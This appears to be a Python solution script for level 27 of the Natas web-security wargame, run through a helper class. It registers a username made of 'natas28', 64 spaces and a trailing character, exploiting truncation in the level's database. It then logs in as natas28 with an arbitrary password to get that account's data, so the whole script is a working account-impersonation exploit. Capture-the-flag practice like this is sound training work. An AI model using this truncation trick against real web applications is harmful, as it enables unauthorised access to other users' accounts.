from natas import Natas

natas = Natas('natas27', keep_session=True)

post_data = {
    'username': 'natas28' + 64 * ' ' + 'u',
    'password': 'sdfsf',
}

resp = natas.get_response(post_data=post_data)

post_data = {
    'username': 'natas28',
    'password': 'sdfsf',
}

resp = natas.get_response(post_data=post_data)

print(resp.body)
